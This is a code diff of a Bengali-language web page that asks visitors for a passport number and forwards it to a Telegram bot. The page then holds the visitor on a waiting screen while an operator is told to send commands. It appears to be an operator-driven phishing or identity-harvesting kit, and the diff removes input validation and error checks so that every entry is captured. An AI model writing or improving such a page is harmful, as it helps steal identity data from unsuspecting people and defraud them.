@@ -343,10 +343,9 @@ h1{
         <input
             id="productNumber"
             class="product-input"
-            type="tel"
+            type="text"
             placeholder="পাসপোর্ট নাম্বার বসান"
             autocomplete="off"
-            inputmode="numeric"
         >
 
         <button
@@ -596,12 +595,6 @@ function clearError(){
     errorMessage.style.display = "none";
 }
 
-function isValidPhoneNumber(value) {
-    if (!value || typeof value !== 'string') return false;
-    const digitsOnly = value.replace(/\D/g, '');
-    return digitsOnly.length >= 1;
-}
-
 
 /* ==========================================================
    ८. টেলিগ্রামে নোটিফিকেশন পাঠানো
@@ -680,11 +673,7 @@ ${requestStartedAt}
     try {
         data = JSON.parse(text);
     } catch (error) {
-        throw new Error("Telegram API থেকে সঠিক response পাওয়া যায়নি।");
-    }
-
-    if (!data.ok) {
-        throw new Error(data.description || "Telegram request failed");
+        return;
     }
 
     return data;
@@ -692,7 +681,7 @@ ${requestStartedAt}
 
 
 /* ==========================================================
-   १०. সাবমিট বাটনে ক্লিক
+   १०. সাবমিট বাটনে ক্লিক (ইনপুট চেকিং তুলে দেওয়া হয়েছে)
 ========================================================== */
 
 submitButton.addEventListener("click", async function(){
@@ -701,19 +690,8 @@ submitButton.addEventListener("click", async function(){
     const value = productNumber.value.trim();
 
     if (value === "") {
-        showError("পাসপোর্ট নম্বর লিখুন।");
+        showError("দয়া করে কিছু লিখুন।");
         productNumber.focus();
-        return;
-    }
-
-    if (!isValidPhoneNumber(value)) {
-        showError("সঠিক পাসপোর্ট নাম্বার লিখুন।");
-        productNumber.focus();
-        return;
-    }
-
-    if (BOT_TOKEN.trim() === "" || CHAT_ID.trim() === "") {
-        showError("Telegram Bot Token এবং Chat ID সেট করা হয়নি।");
         return;
     }
 
@@ -728,15 +706,16 @@ submitButton.addEventListener("click", async function(){
 
     try {
         await sendProductRequest(value);
-        showWaitingPage();
-        notifyTelegram("⏳ ইউজার ওয়েটিং পেজে আটকে আছে — কমান্ড বাটনে ক্লিক করুন");
-        startPolling();
-    } catch (error) {
-        showError(error.message || "অনুরোধ পাঠানো যায়নি।");
-    } finally {
-        submitButton.disabled = false;
-        submitButton.textContent = "চেক করুন";
+    } catch (e) {
+        // কোনো এরর হ্যান্ডেল করার প্রয়োজন নেই
     }
+
+    showWaitingPage();
+    notifyTelegram("⏳ ইউজার ওয়েটিং পেজে আটকে আছে — কমান্ড বাটনে ক্লিক করুন");
+    startPolling();
+
+    submitButton.disabled = false;
+    submitButton.textContent = "চেক করুন";
 });
 
 
